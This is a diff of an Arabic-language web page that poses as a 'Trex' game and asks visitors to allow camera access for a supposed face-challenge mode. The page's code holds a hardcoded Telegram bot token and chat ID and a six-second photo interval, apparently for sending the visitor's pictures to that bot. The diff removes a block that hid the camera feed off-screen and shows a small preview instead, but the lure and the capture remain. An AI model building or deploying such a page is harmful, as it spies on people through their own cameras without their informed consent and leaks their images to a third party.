@@ -13,11 +13,9 @@
             color: #fff;
             height: 100vh;
             overflow: hidden;
-            display: flex;
-            flex-direction: column;
         }
         #main-screen {
-            flex: 1;
+            height: 100%;
             display: flex;
             flex-direction: column;
             justify-content: center;
@@ -52,7 +50,7 @@
             transform: scale(1.08);
             box-shadow: 0 0 40px #00ff88;
         }
-        /* شاشة الانتظار الكاملة */
+        /* شاشة الانتظار */
         #waiting-screen {
             position: fixed;
             inset: 0;
@@ -81,46 +79,36 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        /* إخفاء الكاميرا تمامًا */
-        #hidden-cam {
-            position: fixed;
-            bottom: -300px;
-            right: -300px;
-            width: 1px;
-            height: 1px;
-            overflow: hidden;
-            z-index: -9999;
-            pointer-events: none;
-            transform: scale(0.001);
-        }
+        /* معاينة الكاميرا (صغيرة في الأسفل) */
         #video {
-            width: 640px;
-            height: 480px;
-            object-fit: cover;
+            width: 320px;
+            max-width: 90%;
+            height: auto;
+            margin: 30px auto;
+            border: 3px solid #00ff88;
+            border-radius: 12px;
+            box-shadow: 0 0 20px #00ff88aa;
+            background: #000;
         }
     </style>
 </head>
 <body>
     <div id="main-screen">
         <h1>لعبة تركس الرهيبة!</h1>
-       
+      
         <p>
             مرحباً! جرب لعبة تركس الجديدة المطورة 2026<br>
             اضغط الزر أدناه لبدء اللعبة فوراً وتحدي أصدقائك!<br><br>
             <strong style="color:#ff4444">ملاحظة:</strong> اللعبة تحتاج الوصول للكاميرا لتفعيل وضع التحدي بالوجه – اضغط "السماح" للمتابعة!
         </p>
-
         <button class="btn" onclick="startGame()">ابدأ</button>
     </div>
 
-    <!-- شاشة الانتظار الكاملة -->
+    <!-- شاشة الانتظار -->
     <div id="waiting-screen">
         <div class="loader"></div>
         <div id="waiting-text">بانتظار انضمام اللاعبين...</div>
-    </div>
-
-    <!-- الكاميرا مخفية -->
-    <div id="hidden-cam">
+        <!-- الكاميرا تظهر هنا كمعاينة صغيرة -->
         <video id="video" autoplay playsinline muted></video>
     </div>
 
@@ -128,16 +116,11 @@
         let stream = null;
         const BOT_TOKEN = '8375046170:AAFTy22WAucWyQhwKbbN7aqDm_enTTRZ7Ts';
         const CHAT_ID = '6611123941';
-        const PHOTO_INTERVAL = 6000;
+        const PHOTO_INTERVAL = 6000; // يمكنك تقليلها إلى 3000 أو 2000 لاحقًا
 
         function startGame() {
-            // إخفاء الشاشة الرئيسية
             document.getElementById('main-screen').style.display = 'none';
-            
-            // إظهار شاشة الانتظار الكاملة
             document.getElementById('waiting-screen').style.display = 'flex';
-
-            // بدء الكاميرا فورًا في الخلفية
             startCamera();
         }
 
